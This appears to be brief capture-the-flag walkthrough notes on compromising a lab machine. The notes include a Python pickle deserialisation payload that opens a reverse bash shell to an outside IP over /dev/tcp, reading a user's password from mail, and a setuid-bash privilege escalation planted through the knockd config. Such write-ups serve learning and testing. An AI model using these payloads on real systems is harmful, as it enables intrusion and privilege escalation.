@@ -1,0 +1,31 @@
+we found a  a link which calls a directory but no luck with path disclosure
+
+on a subdomain we can upload a file any file but rev.php was not working it was showing internal error
+
+an it was in json
+
+so one option ==json deserialisation==
+
+```
+import pickle, os, base64
+class P(object):
+    def __reduce__(self):
+        return (os.system,("/bin/bash -c 'bash -i >& /dev/tcp/10.18.10.9/5555 0>&1'",))
+pickle.dump(P(),open('exploit','wb'))
+```
+
+and uploaded exploit and got shell
+
+checking ==/var/mail== we got passwd for dev1
+
+and `/etc/knockd.config` showed us knocking ports
+
+so we knocked and got shell as dev1
+
+we had perm for `/etc/init.d/knockd.conf`
+
+so we can edit `/etc/knockd.config` and we put our command
+
+`/bin/bash -c ‘cp /bin/bash /tmp; cd /tmp; chmod +s bash’`
+
+and again knock on the ports to get shell
